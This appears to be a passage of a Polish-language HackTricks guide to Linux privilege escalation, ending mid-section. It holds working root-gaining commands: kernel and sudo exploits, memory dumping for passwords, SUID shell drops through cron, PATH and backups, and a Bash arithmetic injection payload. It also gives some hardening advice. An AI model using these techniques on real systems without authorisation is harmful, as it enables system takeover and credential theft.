# Eskalacja uprawnień w systemie Linux

{{#include ../../../banners/hacktricks-training.md}}

## Informacje o systemie

### Informacje o systemie operacyjnym

Zacznijmy od zdobycia podstawowych informacji o uruchomionym systemie operacyjnym
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Ścieżka

Jeśli **masz uprawnienia do zapisu w dowolnym katalogu znajdującym się w zmiennej `PATH`**, możesz przejąć kontrolę nad niektórymi bibliotekami lub plikami binarnymi:
```bash
echo $PATH
```
### Informacje o środowisku

Interesujące informacje, hasła lub klucze API w zmiennych środowiskowych?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Sprawdź wersję kernela i zobacz, czy istnieje exploit, którego można użyć do eskalacji uprawnień
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych wersji kernel oraz kilka już **compiled exploits** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) oraz [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Inne strony, na których można znaleźć **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje kernel z tej strony, możesz wykonać:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukiwaniu kernel exploits, to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (uruchom w ofierze, sprawdza tylko exploity dla kernela 2.x)

Zawsze **wyszukuj wersję kernela w Google**, ponieważ być może Twoja wersja kernela jest podana w którymś kernel exploicie, a wtedy będziesz mieć pewność, że ten exploit jest poprawny.

Dodatkowe techniki kernel exploitation:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Eskalacja uprawnień w systemie Linux - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Wersja Sudo

Na podstawie podatnych wersji sudo, które pojawiają się w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, używając tego polecenia grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Wersje Sudo starsze niż 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) pozwalają lokalnym użytkownikom bez uprawnień eskalować uprawnienia do roota za pomocą opcji sudo `--chroot`, gdy plik `/etc/nsswitch.conf` jest używany z katalogu kontrolowanego przez użytkownika.

Tutaj znajduje się [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) umożliwiający wykorzystanie tej [podatności](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Przed uruchomieniem exploita upewnij się, że Twoja wersja `sudo` jest podatna i obsługuje funkcję `chroot`.

Więcej informacji znajdziesz w oryginalnym [ostrzeżeniu dotyczącym podatności](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo w wersji wcześniejszej niż 1.9.17p1 (zgłoszony zakres podatnych wersji: **1.8.8–1.9.17**) może oceniać reguły sudoers oparte na hoście, używając **nazwy hosta podanej przez użytkownika** z `sudo -h <host>` zamiast **rzeczywistej nazwy hosta**. Jeśli sudoers przyznaje szersze uprawnienia na innym hoście, możesz lokalnie **spoofować** ten host.

Wymagania:
- Podatna wersja sudo
- Reguły sudoers specyficzne dla hosta (host nie jest bieżącą nazwą hosta ani `ALL`)

Przykładowy wzorzec sudoers:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit poprzez spoofing dozwolonego hosta:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Jeśli rozwiązywanie spoofed name się blokuje, dodaj je do `/etc/hosts` lub użyj hostname, który już występuje w logach/konfiguracjach, aby uniknąć zapytań DNS.

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Weryfikacja podpisu Dmesg nie powiodła się

Sprawdź **smasher2 box of HTB**, aby zobaczyć **przykład** wykorzystania tej vuln
```bash
dmesg 2>/dev/null | grep "signature"
```
### Dalsze rozpoznanie systemu
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wylicz możliwe zabezpieczenia

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Jeśli znajdujesz się wewnątrz kontenera, zacznij od poniższej sekcji container-security, a następnie przejdź do stron dotyczących nadużyć specyficznych dla danego runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Dyski

Sprawdź, **co jest zamontowane i odmontowane**, gdzie oraz dlaczego. Jeśli coś jest odmontowane, możesz spróbować to zamontować i sprawdzić, czy zawiera prywatne informacje
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wyszczególnij przydatne pliki binarne
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź również, czy **jest zainstalowany jakikolwiek kompilator**. Jest to przydatne, jeśli musisz użyć exploita kernela, ponieważ zaleca się skompilowanie go na maszynie, na której zamierzasz go użyć (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane podatne oprogramowanie

Sprawdź **wersję zainstalowanych pakietów i usług**. Być może zainstalowana jest stara wersja Nagios (na przykład), którą można wykorzystać do eskalacji uprawnień…\
Zaleca się ręczne sprawdzenie wersji bardziej podejrzanego zainstalowanego oprogramowania.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Jeśli masz dostęp SSH do maszyny, możesz również użyć **openVAS**, aby sprawdzić, czy na maszynie jest zainstalowane nieaktualne i podatne oprogramowanie.

> [!NOTE] > _Pamiętaj, że te polecenia wyświetlą wiele informacji, które w większości będą nieprzydatne. Dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy którakolwiek z zainstalowanych wersji oprogramowania jest podatna na znane exploity_

## Procesy

Sprawdź, **jakie procesy** są wykonywane, i zobacz, czy którykolwiek proces ma **więcej uprawnień, niż powinien** (może tomcat jest uruchamiany przez root?).
```bash
ps aux
ps -ef
top -n 1
```
Zawsze sprawdzaj, czy nie działają [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md), ponieważ można je wykorzystać do eskalacji uprawnień. **Linpeas** wykrywa je, sprawdzając parametr `--inspect` w wierszu poleceń procesu.\
Sprawdź również **swoje uprawnienia do plików binarnych procesów** — być może możesz nadpisać plik należący do innego użytkownika.

### Łańcuchy procesów nadrzędnych i podrzędnych między użytkownikami

Proces podrzędny działający pod **innym użytkownikiem** niż jego proces nadrzędny nie jest automatycznie złośliwy, ale stanowi użyteczny **sygnał triage**. Niektóre przejścia są oczekiwane (`root` uruchamiający użytkownika usługi, menedżery logowania tworzące procesy sesji), ale nietypowe łańcuchy mogą ujawnić wrappery, debug helpers, persistence lub słabe granice zaufania środowiska uruchomieniowego.

Szybki przegląd:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Jeśli znajdziesz zaskakujący łańcuch, sprawdź wiersz poleceń procesu nadrzędnego oraz wszystkie pliki wpływające na jego działanie (`config`, `EnvironmentFile`, skrypty pomocnicze, katalog roboczy, zapisywalne argumenty). W kilku rzeczywistych ścieżkach privesc sam proces potomny nie był zapisywalny, ale **config kontrolowany przez proces nadrzędny** lub łańcuch skryptów pomocniczych już tak.

### Usunięte pliki wykonywalne i usunięte, otwarte pliki

Artefakty środowiska uruchomieniowego są często nadal dostępne **po usunięciu**. Jest to przydatne zarówno do eskalacji uprawnień, jak i do odzyskiwania dowodów z procesu, który nadal ma otwarte poufne pliki.

Sprawdź usunięte pliki wykonywalne:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Jeśli `/proc/<PID>/exe` wskazuje na `(deleted)`, proces nadal uruchamia stary obraz pliku binarnego z pamięci. Jest to silny sygnał do dalszego zbadania, ponieważ:

- usunięty plik wykonywalny może zawierać interesujące ciągi znaków lub dane uwierzytelniające
- uruchomiony proces może nadal udostępniać przydatne deskryptory plików
- usunięty uprzywilejowany plik binarny może wskazywać na niedawną manipulację lub próbę zatarcia śladów

Zbierz globalnie otwarte pliki oznaczone jako usunięte:
```bash
lsof +L1
```
Jeśli znajdziesz interesujący deskryptor, odzyskaj go bezpośrednio:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Jest to szczególnie wartościowe, gdy proces nadal ma otwarty usunięty sekret, skrypt, eksport bazy danych lub plik flagi.

### Monitorowanie procesów

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. Może to być bardzo przydatne do identyfikowania podatnych procesów, które są często uruchamiane lub uruchamiane po spełnieniu określonego zestawu wymagań.

### Pamięć procesów

Niektóre usługi serwera zapisują **poświadczenia w jawnym tekście w pamięci**.\
Zwykle potrzebujesz **uprawnień root**, aby odczytać pamięć procesów należących do innych użytkowników, dlatego jest to zazwyczaj bardziej przydatne, gdy masz już uprawnienia root i chcesz znaleźć więcej poświadczeń.\
Pamiętaj jednak, że **jako zwykły użytkownik możesz odczytywać pamięć procesów, których jesteś właścicielem**.

> [!WARNING]
> Pamiętaj, że obecnie większość maszyn **domyślnie nie zezwala na ptrace**, co oznacza, że nie możesz zrzucać pamięci innych procesów należących do Twojego nieuprzywilejowanego użytkownika.
>
> Plik _**/proc/sys/kernel/yama/ptrace_scope**_ kontroluje dostępność ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: wszystkie procesy mogą być debugowane, o ile mają ten sam uid. Jest to klasyczny sposób działania ptrace.
> - **kernel.yama.ptrace_scope = 1**: debugowany może być tylko proces nadrzędny.
> - **kernel.yama.ptrace_scope = 2**: tylko administrator może używać ptrace, ponieważ wymaga to capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: żadne procesy nie mogą być śledzone za pomocą ptrace. Po ustawieniu tej wartości wymagany jest reboot, aby ponownie włączyć ptrace.

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz uzyskać Heap i przeszukać go pod kątem jej poświadczeń.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skrypt GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Dla danego identyfikatora procesu plik **maps pokazuje sposób odwzorowania pamięci w przestrzeni** adresowej procesu; pokazuje również **uprawnienia każdego odwzorowanego regionu**. Pseudo-plik **mem udostępnia samą pamięć procesu**. Z pliku **maps** wiemy, które **regiony pamięci są odczytywalne** oraz jakie są ich przesunięcia. Wykorzystujemy te informacje, aby **przejść do odpowiednich miejsc w pliku mem i zrzucić wszystkie odczytywalne regiony** do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` zapewnia dostęp do **fizycznej** pamięci systemu, a nie do pamięci wirtualnej. Wirtualna przestrzeń adresowa kernela jest dostępna za pomocą /dev/kmem.\
Zazwyczaj `/dev/mem` jest dostępne tylko do odczytu dla użytkownika **root** i grupy **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump dla Linux

ProcDump to linuxowa wersja klasycznego narzędzia ProcDump z pakietu narzędzi Sysinternals dla systemu Windows. Pobierz je z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Do zrzucenia pamięci procesu możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania dotyczące root i zrzucić pamięć procesu należącego do Ciebie
- Skrypt A.5 z [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany jest root)

### Dane uwierzytelniające z pamięci procesu

#### Przykład manualny

Jeśli znajdziesz uruchomiony proces uwierzytelniający:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz wykonać dump procesu (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby na zrzucenie pamięci procesu) i wyszukać dane uwierzytelniające w pamięci:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **kradnie hasła w postaci jawnego tekstu z pamięci** oraz z niektórych **dobrze znanych plików**. Do poprawnego działania wymaga uprawnień root.

| Funkcja                                           | Nazwa procesu         |
| ------------------------------------------------- | ---------------------- |
| Hasło GDM (Kali Desktop, Debian Desktop)          | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktywne połączenia FTP)                   | vsftpd               |
| Apache2 (aktywne sesje HTTP Basic Auth)           | apache2              |
| OpenSSH (aktywne sesje SSH - użycie Sudo)         | sshd:                |

#### Wyszukiwanie Regex/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zaplanowane zadania/Cron

### Crontab UI (alseambusher) działający jako root – eskalacja uprawnień przez scheduler webowy

Jeśli panel webowy „Crontab UI” (alseambusher/crontab-ui) działa jako root i jest powiązany tylko z loopbackiem, nadal możesz uzyskać do niego dostęp za pomocą lokalnego przekierowania portu SSH i utworzyć uprzywilejowane zadanie w celu eskalacji uprawnień.

Typowy przebieg
- Wykryj port dostępny tylko przez loopback (np. 127.0.0.1:8000) oraz realm Basic-Auth za pomocą `ss -ntlp` / `curl -v localhost:8000`
- Znajdź dane uwierzytelniające w artefaktach operacyjnych:
- Backupach/skryptach zawierających `zip -P <password>`
- Unit systemd ujawniającym `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Utwórz tunel i zaloguj się:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Utwórz zadanie z wysokimi uprawnieniami i uruchom je natychmiast (upuszcza powłokę SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Użyj go:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Nie uruchamiaj Crontab UI jako root; ogranicz je za pomocą dedykowanego użytkownika i minimalnych uprawnień
- Powiąż z localhost i dodatkowo ogranicz dostęp za pomocą firewalla/VPN; nie używaj ponownie haseł
- Unikaj osadzania sekretów w plikach unit; używaj secret stores lub pliku EnvironmentFile dostępnego wyłącznie dla root
- Włącz audytowanie/logowanie wykonywania zadań na żądanie



Sprawdź, czy któryś z zaplanowanych jobów jest podatny. Być może możesz wykorzystać skrypt wykonywany przez root (wildcard vuln? możesz modyfikować pliki używane przez root? użyć symlinks? utworzyć określone pliki w katalogu używanym przez root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Jeśli używany jest `run-parts`, sprawdź, które nazwy zostaną rzeczywiście wykonane:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Pozwala to uniknąć false positives. Zapisywalny katalog okresowy jest przydatny tylko wtedy, gdy nazwa pliku payloadu jest zgodna z lokalnymi regułami `run-parts`.

### Ścieżka Cron

Na przykład wewnątrz _/etc/crontab_ można znaleźć PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zwróć uwagę, że użytkownik „user” ma uprawnienia do zapisu w /home/user_)

Jeśli w tym crontabie użytkownik root spróbuje wykonać polecenie lub skrypt bez ustawiania ścieżki. Na przykład: _\* \* \* \* root overwrite.sh_\
Wtedy możesz uzyskać root shell, używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron używający skryptu z wildcardem (Wildcard Injection)

Jeśli skrypt jest wykonywany przez root i zawiera „**\***” wewnątrz polecenia, możesz to wykorzystać do wykonania nieoczekiwanych działań (takich jak privesc). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeśli wildcard jest poprzedzony ścieżką, np.** _**/some/path/\***_ **, nie jest podatny (nawet** _**./\***_ **nie jest).**

Przeczytaj poniższą stronę, aby poznać więcej trików związanych z wykorzystywaniem wildcardów:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Wstrzykiwanie przez rozszerzanie arytmetyczne Bash w parserach logów cron

Bash wykonuje rozszerzanie parametrów i podstawianie poleceń przed obliczeniem arytmetycznym w ((...)), $((...)) oraz let. Jeśli root cron/parser odczytuje niezaufane pola logów i przekazuje je do kontekstu arytmetycznego, attacker może wstrzyknąć podstawienie polecenia $(...), które zostanie wykonane jako root podczas uruchamiania cron.

- Dlaczego to działa: W Bash rozszerzenia są wykonywane w następującej kolejności: rozszerzanie parametrów/zmiennych, podstawianie poleceń, rozszerzanie arytmetyczne, a następnie dzielenie słów i rozszerzanie nazw ścieżek. Wartość taka jak `$(/bin/bash -c 'id > /tmp/pwn')0` jest najpierw podstawiana (co uruchamia polecenie), a następnie pozostała liczbowa wartość `0` jest używana w obliczeniach arytmetycznych, dzięki czemu skrypt działa dalej bez błędów.

- Typowy podatny wzorzec:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Spraw, aby tekst kontrolowany przez attackera został zapisany w analizowanym logu, tak aby pole wyglądające jak liczbowe zawierało podstawienie polecenia i kończyło się cyfrą. Upewnij się, że Twoje polecenie nie wypisuje nic na stdout (lub przekieruj jego wyjście), aby obliczenia arytmetyczne pozostały poprawne.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Nadpisywanie skryptu cron i symlink

Jeśli **możesz modyfikować skrypt cron** wykonywany przez root, możesz bardzo łatwo uzyskać shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli skrypt wykonywany przez root używa **katalogu, do którego masz pełny dostęp**, przydatne może być usunięcie tego folderu i **utworzenie dowiązania symbolicznego do innego folderu** zawierającego kontrolowany przez Ciebie skrypt.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Walidacja dowiązań symbolicznych i bezpieczniejsza obsługa plików

Podczas przeglądania uprzywilejowanych skryptów/binarek, które odczytują lub zapisują pliki na podstawie ścieżki, sprawdź, jak obsługiwane są dowiązania:

- `stat()` podąża za dowiązaniem symbolicznym i zwraca metadane celu.
- `lstat()` zwraca metadane samego dowiązania.
- `readlink -f` i `namei -l` pomagają rozwiązać końcowy cel oraz wyświetlić uprawnienia każdego komponentu ścieżki.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Dla defenders/developers bezpieczniejsze wzorce przeciwko symlink tricks obejmują:

- `O_EXCL` z `O_CREAT`: zakończ niepowodzeniem, jeśli ścieżka już istnieje (blokuje wcześniej utworzone przez attackera linki/pliki).
- `openat()`: operuj względem deskryptora pliku zaufanego katalogu.
- `mkstemp()`: twórz pliki tymczasowe atomowo, z bezpiecznymi uprawnieniami.

### Custom-signed cron binaries with writable payloads
Zespoły obrony czasami „podpisują” binaria uruchamiane przez cron, zrzucając niestandardową sekcję ELF i wyszukując string vendora przed uruchomieniem ich jako root. Jeśli takie binary jest zapisywalne przez grupę (np. `/opt/AV/periodic-checks/monitor` należący do `root:devs 770`) i możesz uzyskać leak materiału użytego do podpisywania, możesz sfałszować sekcję i przejąć zadanie cron:

1. Użyj `pspy`, aby przechwycić przebieg weryfikacji. W Era root uruchamiał `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, następnie `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, a potem wykonywał plik.
2. Odtwórz oczekiwany certyfikat przy użyciu leaked key/config (z `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Zbuduj malicious replacement (np. uruchamiający SUID bash lub dodający twój SSH key) i osadź certyfikat w `.text_sig`, aby grep przeszedł:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Nadpisz scheduled binary, zachowując bity execute:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Poczekaj na następne uruchomienie cron; gdy naiwna kontrola podpisu zakończy się powodzeniem, twój payload zostanie uruchomiony jako root.

### Frequent cron jobs

Możesz monitorować procesy, aby wyszukiwać procesy uruchamiane co 1, 2 lub 5 minut. Być może uda ci się to wykorzystać do privilege escalation.

Na przykład, aby **monitorować co 0.1 s przez 1 minutę**, **sortować według najmniej wykonywanych komend** i usuwać komendy, które zostały wykonane najczęściej, możesz użyć:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz również użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (będzie monitorować i wyświetlać każdy uruchamiany proces).

### Root backups that preserve attacker-set mode bits (pg_basebackup)

Jeśli cron należący do root uruchamia `pg_basebackup` (lub dowolne kopiowanie rekurencyjne) dla katalogu bazy danych, do którego masz prawo zapisu, możesz umieścić **binarkę SUID/SGID**, która zostanie ponownie skopiowana jako **root:root** z tymi samymi bitami uprawnień do katalogu wynikowego kopii zapasowej.

Typowy przebieg rozpoznania (jako użytkownik DB o niskich uprawnieniach):
- Użyj `pspy`, aby wykryć cron roota wywołujący co minutę coś takiego jak `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- Potwierdź, że klaster źródłowy (np. `/var/lib/postgresql/14/main`) jest zapisywalny przez Ciebie, a katalog docelowy (`/opt/backups/current`) po wykonaniu zadania staje się własnością roota.

Eksploitacja:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Działa to, ponieważ `pg_basebackup` zachowuje bity trybu plików podczas kopiowania klastra; gdy zostanie uruchomiony przez root, pliki docelowe dziedziczą **własność root + wybrane przez atakującego SUID/SGID**. Każda podobna uprzywilejowana procedura backupu/kopiowania, która zachowuje uprawnienia i zapisuje dane w lokalizacji wykonywalnej, jest podatna na atak.

### Niewidoczne zadania cron

Możliwe jest utworzenie zadania cron **poprzez umieszczenie znaku powrotu karetki po komentarzu** (bez znaku nowej linii), a zadanie cron będzie działać. Przykład (zwróć uwagę na znak powrotu karetki):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Aby wykryć tego rodzaju ukryty wpis, sprawdź pliki cron za pomocą narzędzi ujawniających znaki sterujące:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Usługi

### Zapisywalne pliki _.service_

Sprawdź, czy możesz zapisywać do dowolnego pliku `.service`; jeśli tak, **możesz go zmodyfikować**, aby **wykonywał** Twój **backdoor, gdy** usługa jest **uruchamiana**, **restartowana** lub **zatrzymywana** (może być konieczne zaczekanie na ponowne uruchomienie maszyny).\
Na przykład utwórz backdoor wewnątrz pliku .service za pomocą **`ExecStart=/tmp/script.sh`**

### Zapisywalne pliki binarne usług

Pamiętaj, że jeśli masz **uprawnienia do zapisu do plików binarnych wykonywanych przez usługi**, możesz zmodyfikować je tak, aby zawierały backdoory, dzięki czemu po ponownym wykonaniu usług backdoory zostaną uruchomione.

### systemd PATH - Ścieżki względne

Możesz sprawdzić PATH używany przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli stwierdzisz, że możesz **zapisywać** w którymkolwiek z folderów ścieżki, możesz być w stanie **eskalować uprawnienia**. Musisz szukać **ścieżek względnych używanych w plikach konfiguracji usług**, takich jak:
